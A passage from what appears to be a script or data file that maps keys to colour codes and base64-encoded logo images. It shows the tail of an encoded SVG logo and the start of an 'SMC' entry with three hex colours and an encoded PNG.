iAgICAgICBjbGlwUGF0aFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIKICAgICAgIGlkPSJjbGlwUGF0aDE2Ij48cGF0aAogICAgICAgICBkPSJNIDAsMTY2Ljg4NSBIIDYyOC4yMzggViAwIEggMCBaIgogICAgICAgICBpZD0icGF0aDE0IiAvPjwvY2xpcFBhdGg+PC9kZWZzPjxnCiAgICAgaWQ9Imc4IgogICAgIHRyYW5zZm9ybT0ibWF0cml4KDEyLjk0NDA1MywwLDAsLTEyLjk0NDA1MywtNTQwLjAzNjI1LDE2MjAuMDIzMykiPjxnCiAgICAgICBpZD0iZzEwIj48ZwogICAgICAgICBpZD0iZzEyIgogICAgICAgICBjbGlwLXBhdGg9InVybCgjY2xpcFBhdGgxNikiPjxnCiAgICAgICAgICAgaWQ9ImcxOCIKICAgICAgICAgICB0cmFuc2Zvcm09InRyYW5zbGF0ZSg1NTguOTMyOCw4OC41MDk4KSI+PHBhdGgKICAgICAgICAgICAgIGQ9Im0gMCwwIHYgLTExLjM1OCBoIDcuOTgyIHYgLTExLjI2OSBjIDAuMDI1LC0xLjAwNyAtMC4wMywtMi4wOTMgLTAuMjAzLC0yLjk2MiAtMC4zMTcsLTIuMTAyIC0yLjMxNCwtNS42ODEgLTcuOTgsLTUuNjgxIC01LjYzMiwwIC03LjU5MywzLjU3OSAtNy45MzMsNS42ODEgLTAuMTQzLDAuODY5IC0wLjIwNCwxLjk1NSAtMC4yMDQsMi45NjIgdiAzNS41OTMgYyAwLDEuMjU5IDAuMDg1LDIuNjM3IDAuMzUyLDMuNjggMC4zODcsMS44OTcgMi4wNjgsNS42MzggNy43NDMsNS42MzggNS45NTcsMCA3LjQ0NCwtMy45NDQgNy43ODUsLTUuNjM4IDAuMjI0LC0xLjEyMiAwLjIzNywtMy4wMDQgMC4yMzcsLTMuMDA0IFYgOS4zMiBoIDE5LjYxMyB2IDIuNTU1IGMgMCwwIDAuMDg5LDIuNjY2IC0wLjE0OSw1LjE1NCBDIDI1Ljc2OSwzMS42MzggMTMuNzMyLDM2LjI2IC0wLjA3LDM2LjI2IGMgLTEzLjgyNywwIC0yNS42MiwtNC42NjUgLTI3LjMzOCwtMTkuMjMxIC0wLjE1NSwtMS4zMzIgLTAuMzkyLC0zLjcyOCAtMC4zOTIsLTUuMTU0IHYgLTMyLjc0MiBjIDAsLTEuNDI2IDAuMDQ2LC0yLjUzIDAuMzEsLTUuMTM2IDEuMjgsLTE0LjIwNyAxMy41OTMsLTE5LjI0MyAyNy4zNjUsLTE5LjI0MyAxMy44NTcsMCAyNi4wODUsNS4wMzYgMjcuMzg3LDE5LjI0MyAwLjIzMSwyLjYwNiAwLjI1NSwzLjcxIDAuMjg2LDUuMTM2IFYgMCBaIG0gLTEzNS4yMzUsMzQuMTY1IGggLTE5LjY5NiB2IC01Ny42MTMgYyAwLjAzMSwtMS4wMDQgMCwtMi4xMzIgLTAuMTczLC0yLjk1OSAtMC40MTEsLTEuOTM0IC0yLjA1LC01LjY1NiAtNy40ODQsLTUuNjU2IC01LjM2NCwwIC03LjA0NiwzLjcyMiAtNy40MjYsNS42NTYgLTAuMTk3LDAuODI3IC0wLjIyMiwxLjk1NSAtMC4xOTcsMi45NTkgdiA1Ny42MTMgaCAtMTkuNjkgViAtMjEuNjYgYyAtMC4wMjUsLTEuNDM5IDAuMDg4LC00LjM3OSAwLjE3MywtNS4xNDkgMS4zNTksLTE0LjU0NyAxMi44MjQsLTE5LjI3IDI3LjE0LC0xOS4yNyAxNC4zNDQsMCAyNS44MDIsNC43MjMgMjcuMTg2LDE5LjI3IDAuMTA5LDAuNzcgMC4yNTIsMy43MSAwLjE2Nyw1LjE0OSB6IG0gLTE4MC45NywwIC05LjgyNSwtNjAuODc2IC05LjgxOSw2MC44NzYgaCAtMzEuNzcxIGwgLTEuNjg1LC03Ny44NzggaCAxOS40NjQgbCAwLjUyNyw3Mi4wOTQgMTMuMzkyLC03Mi4wOTQgaCAxOS43NDggbCAxMy40MDQsNzIuMDk0IDAuNTI5LC03Mi4wOTQgaCAxOS41MTMgbCAtMS43NDIsNzcuODc4IHogbSAtMTE3LjYzMSwwIC0xNC40MjYsLTc3Ljg3OCBoIDIxLjAzNyBsIDEwLjg3MSw3Mi4wOTQgMTAuNjEsLTcyLjA5NCBoIDIwLjg5MSBsIC0xNC4zNjYsNzcuODc4IHogbSAzNjcuNDM1LC02Mi43MDEgLTE4LjM0LDYyLjcwMSBoIC0yOC45IHYgLTc3LjA2NiBoIDE5LjExOCBsIC0xLjExLDY0LjcwNyAxOS42OTYsLTY0LjcwNyBoIDI3LjcxNyB2IDc3LjA2NiBoIC0xOS4yNDMgeiBtIC0xNzYuODM4LDQyLjQzMyBjIC0wLjM0NiwxLjUzOCAtMC4yNDYsMy4xNzIgLTAuMDY3LDQuMDI2IDAuNTU3LDIuNDkzIDIuMjMyLDUuMjEyIDcuMDU4LDUuMjEyIDQuNDk4LDAgNy4xMzUsLTIuODA0IDcuMTM1LC03LjAxMiB2IC00Ljc2MiBoIDE5LjIgdiA1LjQyOCBjIDAsMTYuNzggLTE1LjA0NCwxOS40MTYgLTI1LjkzNiwxOS40MTYgLTEzLjcxOCwwIC0yNC45MjEsLTQuNTIyIC0yNi45NjcsLTE3LjE0OCAtMC41NDEsLTMuNDM2IC0wLjY3NSwtNi40ODYgMC4xODYsLTEwLjM3OCAzLjMzNiwtMTUuNzQzIDMwLjc0MywtMjAuMzEgMzQuNzIxLC0zMC4yNjYgMC43MDIsLTEuODg2IDAuNTAxLC00LjI5MSAwLjE0MywtNS43MDggLTAuNTk2LC0yLjU5MSAtMi4zMzksLTUuMTk3IC03LjUwNiwtNS4xOTcgLTQuODQ2LDAgLTcuNzYzLDIuNzg2IC03Ljc2Myw2Ljk4NSBsIC0wLjAwNiw3LjQ3NCBoIC0yMC42NjYgdiAtNS45NDEgYyAwLC0xNy4yMTUgMTMuNDg0LC0yMi40MDkgMjguMDA3LC0yMi40MDkgMTMuOTA5LDAgMjUuMzk3LDQuNzUzIDI3LjI0LDE3LjYzNyAwLjg3OSw2LjY1NyAwLjIxNiwxMC45OTMgLTAuMTM3LDEyLjYyNiAtMy4yMiwxNi4xNDcgLTMyLjQzMSwyMS4wMDQgLTM0LjY0MiwzMC4wMTcgbSAtMjUzLjI3MywwLjE5MSBjIC0wLjM3NywxLjU3IC0wLjI4OSwzLjIyNyAtMC4wNzksNC4wOTEgMC41MzIsMi40ODEgMi4yMTcsNS4yNDggNy4xMjgsNS4yNDggNC41NTUsMCA3LjIzNywtMi44MzEgNy4yMzcsLTcuMDczIHYgLTQuODIgaCAxOS40MjUgdiA1LjQ3MSBjIDAsMTYuOTQxIC0xNS4yNzQsMTkuNjQxIC0yNi4yODUsMTkuNjQxIC0xMy44MzMsMCAtMjUuMTM2LC00LjU5MiAtMjcuMjA0LC0xNy4zMDkgLTAuNTY2LC0zLjQ5MSAtMC42NjMsLTYuNTYyIDAuMTU1LC0xMC40OTcgMy4zNzIsLTE1LjkyMiAzMS4wNSwtMjAuNTI2IDM1LjA3NywtMzAuNjAxIDAuNzU0LC0xLjg3MyAwLjUyNiwtNC4yNzggMC4xNTIsLTUuNzUgLTAuNjM5LC0yLjYxOCAtMi4zOTYsLTUuMjYxIC03LjYwNiwtNS4yNjEgLTQuODY1LDAgLTcuNzc1LDIuODM0IC03Ljc3NSw3LjA5MSBsIC0wLjAyNyw3LjQ5NCBoIC0yMC44OTggdiAtNS45NTUgYyAwLC0xNy40MTIgMTMuNjc1LC0yMi42NDggMjguMzExLC0yMi42NDggMTQuMDcxLDAgMjUuNjI2LDQuNzk1IDI3LjUxMSwxNy44MjggMC45MzcsNi43MTggMC4yMzQsMTEuMDkgLTAuMDgyLDEyLjc0OCAtMy4yODcsMTYuMzQ1IC0zMi44MjMsMjEuMTg2IC0zNS4wNCwzMC4zMDIiCiAgICAgICAgICAgICBzdHlsZT0iZmlsbDojMTQyOGEwO2ZpbGwtb3BhY2l0eToxO2ZpbGwtcnVsZTpub256ZXJvO3N0cm9rZTpub25lIgogICAgICAgICAgICAgaWQ9InBhdGgyMCIgLz48L2c+PC9nPjwvZz48L2c+PC9zdmc+Cg=='
										["SMC"]='#B3C9E0 #4F4F4F #CCCCCC data:image/png;base64,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